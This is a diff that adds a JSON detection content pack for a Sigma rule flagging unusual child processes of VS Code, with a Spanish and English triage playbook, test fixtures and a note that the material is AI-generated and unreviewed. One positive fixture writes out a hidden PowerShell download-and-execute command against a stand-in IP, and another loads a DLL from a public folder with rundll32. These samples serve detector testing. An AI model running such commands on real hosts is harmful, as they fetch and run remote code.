@@ -1,0 +1,133 @@
+{
+  "rule": {
+    "id": "5a3164f2-b373-4152-93cf-090b13c12d27",
+    "title": "Potentially Suspicious Child Process Of VsCode",
+    "level": "medium",
+    "status": "test",
+    "author": "Nasreddine Bencherchali (Nextron Systems)",
+    "path": "windows/process_creation/proc_creation_win_vscode_child_processes_anomalies.yml",
+    "url": "https://github.com/SigmaHQ/sigma/blob/05d1031f537e830b76da53bae2400c5814c89165/rules/windows/process_creation/proc_creation_win_vscode_child_processes_anomalies.yml",
+    "license": "DRL-1.1",
+    "techniques": [
+      "T1202",
+      "T1218"
+    ]
+  },
+  "playbook": {
+    "es": {
+      "summary": "Un proceso code.exe de Visual Studio Code inició un proceso hijo poco común: un binario LOLBin o de scripting, un shell con comandos sospechosos o un ejecutable ubicado en una carpeta temporal o pública.",
+      "what_it_detects": "Eventos de creación de procesos en los que ParentImage termina en \\code.exe y el hijo cumple al menos una condición: Image es calc, regsvr32, rundll32, cscript o wscript; Image es powershell, pwsh o cmd y CommandLine contiene IEX, Invoke-Command, ICM, DownloadString, rundll32, regsvr32, wscript o cscript; o Image está en :\\Users\\Public\\, :\\Windows\\Temp\\ o :\\Temp\\.",
+      "why_it_matters": "VS Code puede ejecutar comandos de forma automática mediante tasks.json (por ejemplo, al abrir una carpeta) o perfiles de terminal. Un atacante puede usarlo para persistencia o para ejecución indirecta de comandos y proxy de binarios firmados (T1202, T1218), ocultándose tras un proceso confiable de desarrollo.",
+      "triage_steps": [
+        "Revise Image, CommandLine y ParentImage; confirme que code.exe es el binario legítimo de Microsoft (ruta de instalación, firma y hash).",
+        "Identifique al usuario y el host; determine si es un desarrollador y si ese uso de VS Code es habitual en ese equipo.",
+        "Analice CommandLine en busca de URLs, IEX/DownloadString, contenido codificado o DLL cargadas desde rutas de usuario, temporales o públicas.",
+        "Busque en la carpeta del proyecto abierto los archivos .vscode\\tasks.json y settings.json (terminal.integrated.profiles, runOn: folderOpen) y revise su contenido y fecha de modificación.",
+        "Revise los procesos hijos y las conexiones de red del proceso sospechoso en el mismo host, en una ventana de +/- 15 minutos.",
+        "Verifique si el repositorio o el workspace se clonó o descargó recientemente desde un origen externo o no confiable.",
+        "Busque alertas previas para el mismo usuario, host o hash, y ejecuciones similares en otros endpoints."
+      ],
+      "false_positives": [
+        "Tareas de compilación o depuración en entornos de desarrollo que invocan cmd, PowerShell o cscript de forma legítima.",
+        "Scripts de build que registran componentes con regsvr32 o prueban DLL con rundll32 durante el desarrollo.",
+        "Herramientas o extensiones que ejecutan binarios desde carpetas temporales, como instaladores o depuradores."
+      ],
+      "response_steps": [
+        "Confirme con el usuario o el responsable del proyecto si la ejecución era esperada antes de tomar acciones.",
+        "Si es malicioso, aísle el endpoint y termine el árbol de procesos derivado de code.exe.",
+        "Preserve y luego elimine las tasks.json, perfiles de terminal o extensiones maliciosas; bloquee los hashes, dominios e IP identificados.",
+        "Revise si hubo credenciales o secretos expuestos en el equipo y rótelos; busque el mismo workspace en otros hosts.",
+        "Ajuste la regla con exclusiones específicas por comando o proyecto para el uso legítimo documentado."
+      ],
+      "severity_rationale": "Nivel medio, porque el patrón es un indicador fuerte de abuso de VS Code, pero en entornos de desarrollo intensivo hay ejecuciones legítimas frecuentes que requieren validación."
+    },
+    "en": {
+      "summary": "A Visual Studio Code process (code.exe) launched an unusual child: a LOLBin or script host, a shell with suspicious commands, or an executable in a public or temp folder.",
+      "what_it_detects": "Process creation events where ParentImage ends with \\code.exe and the child matches at least one condition: Image is calc, regsvr32, rundll32, cscript or wscript; Image is powershell, pwsh or cmd with CommandLine containing IEX, Invoke-Command, ICM, DownloadString, rundll32, regsvr32, wscript or cscript; or Image is under :\\Users\\Public\\, :\\Windows\\Temp\\ or :\\Temp\\.",
+      "why_it_matters": "VS Code can run commands automatically through tasks.json (for example on folder open) or terminal profiles. Attackers can abuse this for persistence, indirect command execution and signed binary proxy execution (T1202, T1218), hiding behind a trusted developer tool.",
+      "triage_steps": [
+        "Review Image, CommandLine and ParentImage; confirm code.exe is the genuine Microsoft binary (install path, signature, hash).",
+        "Identify the user and host; check whether they are a developer and whether this VS Code usage is normal there.",
+        "Inspect CommandLine for URLs, IEX/DownloadString, encoded content, or DLLs loaded from user, temp or public paths.",
+        "In the opened project, review .vscode\\tasks.json and settings.json (terminal.integrated.profiles, runOn: folderOpen) and their modification times.",
+        "Review child processes and network connections of the suspicious process on the same host within +/- 15 minutes.",
+        "Check whether the repository or workspace was recently cloned or downloaded from an external or untrusted source.",
+        "Search for earlier alerts for the same user, host or hash, and similar executions on other endpoints."
+      ],
+      "false_positives": [
+        "Build or debug tasks in development environments that legitimately invoke cmd, PowerShell or cscript.",
+        "Build scripts that register components with regsvr32 or test DLLs with rundll32.",
+        "Tools or extensions that run binaries from temp folders, such as installers or debuggers."
+      ],
+      "response_steps": [
+        "Confirm with the user or project owner whether the execution was expected before acting.",
+        "If malicious, isolate the endpoint and terminate the process tree spawned by code.exe.",
+        "Preserve, then remove malicious tasks.json, terminal profiles or extensions; block identified hashes, domains and IPs.",
+        "Rotate credentials or secrets exposed on the host; hunt for the same workspace on other hosts.",
+        "Tune the rule with narrow command or project exclusions for documented legitimate use."
+      ],
+      "severity_rationale": "Medium, because the pattern strongly suggests VS Code abuse, but heavy development environments produce legitimate matches that need validation."
+    }
+  },
+  "fixtures": {
+    "positive": [
+      {
+        "description": "VS Code spawns PowerShell that downloads and executes a remote script with IEX/DownloadString (selection_children_cli).",
+        "event": {
+          "EventID": 1,
+          "Computer": "WS-0142.andes.example.com",
+          "User": "ANDES\\jperez",
+          "ParentImage": "C:\\Users\\jperez\\AppData\\Local\\Programs\\Microsoft VS Code\\Code.exe",
+          "Image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+          "CommandLine": "powershell.exe -NoProfile -WindowStyle Hidden -Command \"IEX (New-Object Net.WebClient).DownloadString('http://198.51.100.23/a.ps1')\"",
+          "IntegrityLevel": "Medium"
+        }
+      },
+      {
+        "description": "VS Code task launches rundll32 to load a DLL from C:\\Users\\Public (selection_children_images).",
+        "event": {
+          "EventID": 1,
+          "Computer": "WS-0207.andes.example.com",
+          "User": "ANDES\\mrojas",
+          "ParentImage": "C:\\Program Files\\Microsoft VS Code\\Code.exe",
+          "Image": "C:\\Windows\\System32\\rundll32.exe",
+          "CommandLine": "rundll32.exe C:\\Users\\Public\\update.dll,DllRegisterServer",
+          "IntegrityLevel": "Medium"
+        }
+      }
+    ],
+    "negative": [
+      {
+        "description": "VS Code integrated terminal runs a normal dotnet build through PowerShell; no suspicious keywords in CommandLine.",
+        "event": {
+          "EventID": 1,
+          "Computer": "WS-0142.andes.example.com",
+          "User": "ANDES\\jperez",
+          "ParentImage": "C:\\Users\\jperez\\AppData\\Local\\Programs\\Microsoft VS Code\\Code.exe",
+          "Image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+          "CommandLine": "powershell.exe -NoLogo -NoProfile -Command dotnet build .\\src\\Api.csproj",
+          "IntegrityLevel": "Medium"
+        }
+      },
+      {
+        "description": "VS Code source control runs git from its standard install path; image not in the suspicious list or paths.",
+        "event": {
+          "EventID": 1,
+          "Computer": "WS-0207.andes.example.com",
+          "User": "ANDES\\mrojas",
+          "ParentImage": "C:\\Program Files\\Microsoft VS Code\\Code.exe",
+          "Image": "C:\\Program Files\\Git\\cmd\\git.exe",
+          "CommandLine": "git.exe fetch --all",
+          "IntegrityLevel": "Medium"
+        }
+      }
+    ]
+  },
+  "generated": {
+    "tool": "content-pack/1",
+    "model": "claude-opus-5-5",
+    "at": "2026-10-26T02:47:30+00:00",
+    "review": "unreviewed",
+    "notice": "AI-generated content. Review it before relying on it. Fixtures are validated by Centinela's engine in session S7."
+  }
+}
